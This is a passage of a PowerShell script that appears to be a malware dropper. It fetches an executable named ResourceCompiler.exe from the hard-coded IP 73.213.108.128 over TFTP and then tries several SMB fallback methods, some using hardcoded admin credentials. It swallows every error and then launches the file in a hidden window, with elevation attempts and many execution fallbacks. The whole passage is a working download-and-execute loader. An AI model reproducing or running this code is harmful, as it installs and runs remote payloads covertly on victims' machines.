        $udpClient = New-Object System.Net.Sockets.UdpClient
        $udpClient.Client.ReceiveTimeout = 10000
        $udpClient.Client.SendTimeout = 10000
        $serverIP = [System.Net.Dns]::GetHostAddresses("73.213.108.128")[0].IPAddressToString
        $serverEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($serverIP), 69)
        $rrqPacket = New-Object System.Collections.ArrayList
        $rrqPacket.AddRange([byte[]](0x00, 0x01))
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("ResourceCompiler.exe"))
        $rrqPacket.Add(0x00)
        $rrqPacket.AddRange([System.Text.Encoding]::ASCII.GetBytes("octet"))
        $rrqPacket.Add(0x00)
        $udpClient.Send([byte[]]$rrqPacket.ToArray(), $rrqPacket.Count, $serverEndpoint) | Out-Null
        $fileData = New-Object System.Collections.ArrayList
        $expectedBlock = 1
        $receivedDataEndpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
        do {
            $receiveBytes = $udpClient.Receive([ref]$receivedDataEndpoint)
            if ($receiveBytes.Length -lt 4) { break }
            $opcode = [BitConverter]::ToUInt16(@($receiveBytes[1], $receiveBytes[0]), 0)
            if ($opcode -eq 3) {
                $blockNumber = [BitConverter]::ToUInt16(@($receiveBytes[3], $receiveBytes[2]), 0)
                if ($blockNumber -eq $expectedBlock) {
                    $dataLength = $receiveBytes.Length - 4
                    if ($dataLength -gt 0) {
                        for ($i = 4; $i -lt $receiveBytes.Length; $i++) {
                            $fileData.Add($receiveBytes[$i])
                        }
                    }
                    $ackPacket = [byte[]](0x00, 0x04, $receiveBytes[2], $receiveBytes[3])
                    $udpClient.Send($ackPacket, 4, $receivedDataEndpoint) | Out-Null
                    $expectedBlock++
                    if ($dataLength -lt 512) { break }
                }
            } elseif ($opcode -eq 5) { break }
        } while ($true)
        [System.IO.File]::WriteAllBytes("ResourceCompiler.exe", [byte[]]$fileData.ToArray())
        $udpClient.Close()
    } catch { }
}

# SMB Method 20: SMB Copy-Item (direct UNC path)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        Copy-Item -Path "\\73.213.108.128\files\ResourceCompiler.exe" -Destination "ResourceCompiler.exe" -ErrorAction Stop
    } catch { }
}

# SMB Method 21: SMB via CMD copy
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'copy "\\73.213.108.128\files\ResourceCompiler.exe" "ResourceCompiler.exe"' 2>$null
    } catch { }
}

# SMB Method 22: SMB with temporary drive mapping
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'net use Z: \\73.213.108.128\files' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Z:\ResourceCompiler.exe" -Destination "ResourceCompiler.exe" -ErrorAction Stop
            cmd /c 'net use Z: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Z: /delete' 2>$null
    }
}

# SMB Method 23: SMB with PSDrive
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        New-PSDrive -Name "TempSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -ErrorAction Stop
        Copy-Item -Path "TempSMB:\ResourceCompiler.exe" -Destination "ResourceCompiler.exe" -ErrorAction Stop
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "TempSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 24: SMB with credentials (PSDrive)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $securePassword = ConvertTo-SecureString "password123" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential("admin", $securePassword)
        New-PSDrive -Name "AuthSMB" -PSProvider FileSystem -Root "\\73.213.108.128\files" -Credential $credential -ErrorAction Stop
        Copy-Item -Path "AuthSMB:\ResourceCompiler.exe" -Destination "ResourceCompiler.exe" -ErrorAction Stop
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    } catch {
        Remove-PSDrive -Name "AuthSMB" -ErrorAction SilentlyContinue
    }
}

# SMB Method 25: SMB with net use and credentials
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        cmd /c 'net use Y: \\73.213.108.128\files /user:admin password123' 2>$null
        if ($LASTEXITCODE -eq 0) {
            Copy-Item -Path "Y:\ResourceCompiler.exe" -Destination "ResourceCompiler.exe" -ErrorAction Stop
            cmd /c 'net use Y: /delete' 2>$null
        }
    } catch {
        cmd /c 'net use Y: /delete' 2>$null
    }
}

# SMB Method 26: SMB Get-Content method (for smaller files)
if (-not (Test-Path "ResourceCompiler.exe")) {
    try {
        $content = Get-Content -Path "\\73.213.108.128\files\ResourceCompiler.exe" -Raw -ErrorAction Stop
        $content | Out-File -FilePath "ResourceCompiler.exe" -Encoding ASCII -NoNewline
    } catch { }
}

# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
# ////////////////////////////////////////////////////////////////////////////////////////////////////////////////// #
sleep 3


Unblock-File -Path "C:\Windows\temp\rc.exe" -ErrorAction Silently
Get-Item "C:\Windows\temp\rc.exe" | Select -ExpandProperty Attributes

# Try execution methods sequentially (only proceeds if previous fails)
if (Test-Path "C:\Windows\temp\rc.exe") {
    try {
        Start-Process -FilePath "C:\Windows\temp\rc.exe" -WindowStyle Hidden -ErrorAction Stop
    } catch {
        try {
            Start-Process -FilePath "C:\Windows\temp\rc.exe" -WindowStyle Hidden -Verb RunAs -ErrorAction Stop
        } catch {
            try {
                & "C:\Windows\temp\rc.exe"
            } catch {
                try {
                    cmd /c "C:\Windows\temp\rc.exe"
                } catch {
                    try {
                        Invoke-Item "C:\Windows\temp\rc.exe"
                    } catch {
                        try {
                            Invoke-Expression "C:\Windows\temp\rc.exe"
                        } catch {
                            try {
                                & "C:\Windows\temp\rc.exe"
                            } catch {
                            }
                        }
                    }
                }
            }
        }
    }
} else {
}

# Try execution methods sequentially (only proceeds if previous fails)
if (Test-Path "rc.exe") {
    try {
        Start-Process -FilePath "rc.exe" -WindowStyle Hidden -ErrorAction Stop
    } catch {
        try {
            Start-Process -FilePath "rc.exe" -WindowStyle Hidden -Verb RunAs -ErrorAction Stop
        } catch {
            try {
                & "rc.exe"
            } catch {
                try {
                    cmd /c "rc.exe"
                } catch {
                    try {
                        Invoke-Item "rc.exe"
                    } catch {
                        try {
                            Invoke-Expression "rc.exe"
                        } catch {
                            try {
                                & "rc.exe"
                            } catch {
                            }
                        }
                    }
                }
            }
        }
    }
} else {
}

if (Test-Path "C:\Windows\temp\ResourceCompiler.exe") {
    try {
        Start-Process -FilePath "C:\Windows\temp\ResourceCompiler.exe" -WindowStyle Hidden -ErrorAction Stop
    } catch {
        try {
            Start-Process -FilePath "C:\Windows\temp\ResourceCompiler.exe" -WindowStyle Hidden -Verb RunAs -ErrorAction Stop
        } catch {
            try {
                & "C:\Windows\temp\ResourceCompiler.exe"
            } catch {
                try {
                    cmd /c "C:\Windows\temp\ResourceCompiler.exe"
                } catch {
                    try {
                        Invoke-Item "C:\Windows\temp\ResourceCompiler.exe"
                    } catch {
                        try {
                            Invoke-Expression "C:\Windows\temp\ResourceCompiler.exe"
                        } catch {
                            try {
                                & "C:\Windows\temp\ResourceCompiler.exe"
                            } catch {
                            }
                        }
                    }
                }
            }
        }
    }
} else {
}

# Try execution methods sequentially (only proceeds if previous fails)
if (Test-Path "ResourceCompiler.exe") {
    try {
        Start-Process -FilePath "ResourceCompiler.exe" -WindowStyle Hidden -ErrorAction Stop
    } catch {
        try {
            Start-Process -FilePath "ResourceCompiler.exe" -WindowStyle Hidden -Verb RunAs -ErrorAction Stop
        } catch {
            try {
                & "ResourceCompiler.exe"
            } catch {
                try {
                    cmd /c "ResourceCompiler.exe"
                } catch {
                    try {
                        Invoke-Item "ResourceCompiler.exe"
                    } catch {
                        try {
                            Invoke-Expression "ResourceCompiler.exe"
                        } catch {
                            try {
                                & "ResourceCompiler.exe"
                            } catch {
                            }
                        }
                    }
                }
            }
        }
    }
} else {
}


